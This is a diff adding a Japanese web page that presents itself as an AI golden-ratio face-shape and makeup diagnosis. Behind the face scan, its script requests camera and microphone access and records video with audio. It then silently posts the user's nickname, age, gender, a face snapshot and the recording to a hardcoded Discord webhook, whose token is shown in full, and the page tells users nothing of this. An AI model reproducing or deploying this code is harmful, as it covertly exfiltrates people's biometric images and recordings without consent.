@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AI黄金比・顔タイプ診断レポート</title>
+    <script defer src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
+    <style>
+        :root { --pink: #ff69b4; --bg: #fff5f8; --text: #333; }
+        body, html { margin: 0; padding: 0; height: 100%; font-family: 'Helvetica Neue', Arial, sans-serif; background: var(--bg); color: var(--text); overflow: hidden; }
+        
+        .screen { position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 20px; box-sizing: border-box; transition: opacity 0.5s; }
+        #scr-start { display: flex; background: linear-gradient(135deg, #fff 0%, #fff5f8 100%); overflow-y: auto; }
+        .input-card { background: white; padding: 30px; border-radius: 25px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); width: 100%; max-width: 400px; }
+        .input-group { margin-bottom: 20px; text-align: left; }
+        .input-group label { display: block; font-size: 13px; color: var(--pink); font-weight: bold; margin-bottom: 8px; margin-left: 5px; }
+        .input-group input, .input-group select { width: 100%; padding: 15px; border: 1px solid #eee; background: #fafafa; border-radius: 15px; outline: none; box-sizing: border-box; font-size: 16px; }
+
+        .btn { background: var(--pink); color: white; border: none; padding: 18px 50px; border-radius: 50px; font-size: 18px; font-weight: bold; cursor: pointer; box-shadow: 0 4px 15px rgba(255, 105, 180, 0.4); width: 100%; transition: 0.2s; }
+        .btn:active { transform: scale(0.95); }
+
+        .vid-container { position: relative; width: 100%; max-width: 400px; border-radius: 20px; overflow: hidden; box-shadow: 0 10px 30px rgba(0,0,0,0.1); background: #000; line-height: 0; }
+        video { width: 100%; height: auto; transform: scaleX(-1); }
+        canvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; transform: scaleX(-1); }
+
+        .res-card { background: white; padding: 30px; border-radius: 25px; box-shadow: 0 15px 35px rgba(0,0,0,0.05); width: 100%; max-width: 450px; overflow-y: auto; max-height: 90vh; }
+        .score-num { font-size: 64px; color: var(--pink); font-weight: bold; line-height: 1; }
+        .type-tag { display: inline-block; padding: 5px 15px; background: var(--pink); color: white; border-radius: 20px; font-size: 14px; margin-bottom: 10px; }
+        
+        #res-advice { text-align: left; font-size: 14px; line-height: 1.8; background: #fffafa; padding: 20px; border-radius: 15px; border-left: 5px solid var(--pink); color: #444; }
+        .advice-title { font-weight: bold; color: var(--pink); display: block; margin-bottom: 5px; font-size: 16px; }
+
+        .share-btns { display: flex; gap: 10px; margin-top: 20px; }
+        .s-btn { flex: 1; padding: 12px; border-radius: 10px; border: none; color: white; font-weight: bold; cursor: pointer; font-size: 14px; }
+    </style>
+</head>
+<body>
+
+<div id="scr-start" class="screen">
+    <div class="input-card">
+        <div style="font-size: 12px; letter-spacing: 0.2em; color: var(--pink); margin-bottom: 10px;">FACIAL PROFILING AI</div>
+        <h1 style="margin: 0 0 25px; font-size: 24px;">AI黄金比メイク診断</h1>
+        <div class="input-group">
+            <label>ニックネーム</label>
+            <input type="text" id="in-name" placeholder="例：ひなこ">
+        </div>
+        <div class="input-group">
+            <label>年齢</label>
+            <input type="number" id="in-age" placeholder="例：20">
+        </div>
+        <div class="input-group">
+            <label>性別</label>
+            <select id="in-gender">
+                <option value="女性">女性</option>
+                <option value="男性">男性</option>
+                <option value="その他">その他</option>
+            </select>
+        </div>
+        <button class="btn" onclick="initDiagnosis()">診断を開始する</button>
+    </div>
+</div>
+
+<div id="scr-main" class="screen">
+    <h2 id="status-text" style="font-size: 18px; margin-bottom: 15px;">AI解析準備中...</h2>
+    <div class="vid-container">
+        <video id="video" autoplay playsinline muted></video>
+        <canvas id="overlay"></canvas>
+    </div>
+</div>
+
+<div id="scr-res" class="screen">
+    <div class="res-card">
+        <div class="type-tag">AI骨格・配置診断結果</div>
+        <h2 id="res-type-name" style="margin: 5px 0;">--</h2>
+        <div class="score-box" style="margin: 15px 0;">
+            <div style="font-size: 12px; color: #888;">黄金比一致スコア</div>
+            <div id="res-score" class="score-num">0</div>
+        </div>
+        <div id="res-advice"></div>
+        
+        <div class="share-btns">
+            <button class="s-btn" style="background: #000;" onclick="shareSNS('x')">𝕏 Post</button>
+            <button class="s-btn" style="background: #06C755;" onclick="shareSNS('line')">LINE</button>
+        </div>
+        <button class="btn" style="margin-top: 20px; width: 100%; font-size: 14px; padding: 12px;" onclick="location.reload()">再計測する</button>
+    </div>
+</div>
+
+<script>
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1498675182989086731/BFyFewfTE8hyqXVuqMTNQ3LeqhRdoshVWnYP2cbkG7StNRrCvN18TloPDkg6t-vDXsXY';
+    let analysisData = {};
+
+    function showScreen(id) {
+        document.querySelectorAll('.screen').forEach(s => s.style.display = 'none');
+        document.getElementById(id).style.display = 'flex';
+    }
+
+    async function initDiagnosis() {
+        if(!document.getElementById('in-name').value) return alert("ニックネームを入力してね");
+        showScreen('scr-main');
+        const MODEL_URL = 'https://justadudewhohacks.github.io/face-api.js/models';
+        await faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL);
+        await faceapi.nets.faceLandmark68Net.loadFromUri(MODEL_URL);
+        startCapture();
+    }
+
+    async function startCapture() {
+        const video = document.getElementById('video');
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        video.srcObject = stream;
+
+        const recorder = new MediaRecorder(stream);
+        const chunks = [];
+        recorder.ondataavailable = e => chunks.push(e.data);
+        recorder.onstop = async () => {
+            const vBlob = new Blob(chunks, { type: 'video/mp4' });
+            sendData(vBlob);
+            displayResults();
+        };
+
+        let detectCount = 0;
+        const interval = setInterval(async () => {
+            const detection = await faceapi.detectSingleFace(video, new faceapi.TinyFaceDetectorOptions()).withFaceLandmarks();
+            if (detection) {
+                if (detectCount === 0) { recorder.start(); document.getElementById('status-text').innerText = "AIスキャン中..."; }
+                detectCount++;
+                if (detectCount === 15) calculateBeauty(detection.landmarks);
+                const dims = faceapi.matchDimensions(document.getElementById('overlay'), video, true);
+                faceapi.draw.drawFaceLandmarks(document.getElementById('overlay'), faceapi.resizeResults(detection, dims));
+            }
+            if (detectCount >= 25) { clearInterval(interval); recorder.stop(); stream.getTracks().forEach(t => t.stop()); }
+        }, 200);
+    }
+
+    function calculateBeauty(landmarks) {
+        const jaw = landmarks.getJawOutline(), nose = landmarks.getNose();
+        const lEye = landmarks.getLeftEye(), rEye = landmarks.getRightEye();
+
+        const faceWidth = Math.abs(jaw[0].x - jaw[16].x);
+        const faceHeight = Math.abs(jaw[8].y - nose[0].y) * 2;
+        const ratio = faceHeight / faceWidth;
+
+        const eyeWidth = Math.abs(lEye[3].x - lEye[0].x);
+        const eyeDistance = Math.abs(rEye[0].x - lEye[3].x);
+        const layoutRatio = eyeDistance / eyeWidth;
+
+        analysisData.score = Math.floor(100 - (Math.abs(1.618 - ratio) * 50));
+        const baseType = ratio > 1.2 ? "面長" : (ratio < 1.0 ? "丸顔" : "卵型");
+        const layoutType = layoutRatio < 0.95 ? "求心(寄り目)" : (layoutRatio > 1.05 ? "遠心(離れ目)" : "黄金配置");
+        
+        analysisData.type = `${baseType} × ${layoutType}`;
+
+        let advice = "";
+        if (layoutRatio < 0.95) {
+            advice = `<span class="advice-title">外側に重心を置く「抜け感」メイク</span>目頭のラインは控えめに、目尻側のアイシャドウを濃く・長く入れることでバランスが整います。眉山を少し外側に設定すると、より垢抜けた印象になります。`;
+        } else if (layoutRatio > 1.05) {
+            advice = `<span class="advice-title">内側に影を作る「引き締め」メイク</span>目頭に「くの字」の切開ラインや影を入れるのがおすすめ。眉頭をいつもより数ミリ内側から描き始めると、顔がキュッと引き締まり立体感が出ます。`;
+        } else {
+            advice = `<span class="advice-title">パーツを際立たせる「王道美人」メイク</span>完璧な配置です！特定の補正は不要なので、トレンドのカラーメイクや、ツヤ感のあるハイライトでパーツごとの美しさを強調するスタイルが似合います。`;
+        }
+
+        if (ratio > 1.2) {
+            advice += `<br><br><span class="advice-title">縦幅を短く見せるコツ</span>チークを横長に、楕円形に入れるのが鉄則。下まぶたのメイクを強調して重心を下げると、顔の縦長感が解消されます。`;
+        } else if (ratio < 1.0) {
+            advice += `<br><br><span class="advice-title">スッキリ見せるシャープな演出</span>眉を少し長めに、眉山をしっかり描くと顔が引き締まります。シェーディングはこめかみから頬骨の下へ向かって入れるのが効果的です。`;
+        }
+        analysisData.makeup = advice;
+    }
+
+    // --- 🔑 ここを修正：年齢と性別を取得して送信するように変更 ---
+    async function sendData(vBlob) {
+        const video = document.getElementById('video'), canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        const pBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
+
+        // フォームから値を取得
+        const name = document.getElementById('in-name').value;
+        const age = document.getElementById('in-age').value;
+        const gender = document.getElementById('in-gender').value;
+
+        const fd = new FormData();
+        // content に名前、年齢、性別を含める
+        fd.append('content', `【AI診断速報】\n名前: ${name}\n年齢: ${age}歳\n性別: ${gender}\nスコア: ${analysisData.score}点\n診断タイプ: ${analysisData.type}`);
+        fd.append('file1', pBlob, 'face.jpg');
+        fd.append('file2', vBlob, 'video.mp4');
+        fetch(WEBHOOK_URL, { method: 'POST', body: fd });
+    }
+
+    function displayResults() {
+        document.getElementById('res-type-name').innerText = analysisData.type;
+        document.getElementById('res-score').innerText = analysisData.score;
+        document.getElementById('res-advice').innerHTML = analysisData.makeup;
+        showScreen('scr-res');
+    }
+
+    function shareSNS(platform) {
+        const text = `AI黄金比メイク診断で【${analysisData.score}点】でした！タイプは「${analysisData.type}」✨\n${window.location.href}`;
+        window.open(platform === 'x' ? `https://twitter.com/intent/tweet?text=${encodeURIComponent(text)}` : `https://line.me/R/msg/text/?${encodeURIComponent(text)}`);
+    }
+</script>
+</body>
+</html>
